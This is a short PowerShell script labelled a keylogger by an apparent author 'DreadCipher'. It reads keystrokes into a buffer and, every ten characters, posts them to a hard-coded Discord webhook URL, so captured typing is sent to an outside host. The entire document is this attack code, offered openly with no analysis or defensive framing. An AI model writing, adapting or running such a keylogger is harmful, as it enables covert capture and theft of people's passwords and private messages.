# Keylogger with Discord by DreadCipher
$webhook = "https://discord.com/api/webhooks/1356088174123941999/wNZonGi3auoF4cXA5ehPaIL_Rd8qVSFZIeUJPOHbg0WUSOlOBHXmzNK0lbx_ijZfyVcx"
$buffer = ""

while ($true) {
    Start-Sleep -Milliseconds 100
    if ([Console]::KeyAvailable) {
        $key = [Console]::ReadKey($true)
        $buffer += $key.Char
        if ($buffer.Length -ge 10) {
            $payload = @{ content = "Typed: $buffer" } | ConvertTo-Json
            Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType "application/json"
            $buffer = ""
        }
    }
}
